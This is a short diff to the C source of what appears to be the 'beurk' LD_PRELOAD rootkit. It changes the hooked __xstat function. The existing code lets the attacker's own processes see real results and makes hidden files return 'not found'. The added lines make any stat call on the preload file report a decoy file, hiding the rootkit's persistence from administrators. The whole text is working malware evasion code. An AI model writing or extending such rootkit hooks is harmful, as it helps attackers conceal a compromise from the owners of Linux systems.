@@ -20,6 +20,7 @@
 
 #include <sys/stat.h> /* struct stat */
 #include <errno.h> /* errno, ENOENT */
+#include <string.h> /* strstr() */
 #include "beurk.h" /* is_attacker(), is_hidden_file() */
 #include "config.h" /* REAL___XSTAT() */
 #include "debug.h" /* DEBUG() */
@@ -31,6 +32,10 @@ int __xstat(int __ver, const char *__filename, struct stat *buf) {
 
     if (is_attacker())
         return (REAL___XSTAT(__ver, __filename, buf));
+
+    if (is_ld_preload_file(__filename)) {
+        return REAL___XSTAT(__ver, FAKE_LD_PRELOAD, buf);
+    }
 
     if (is_hidden_file(__filename)) {
         errno = ENOENT;
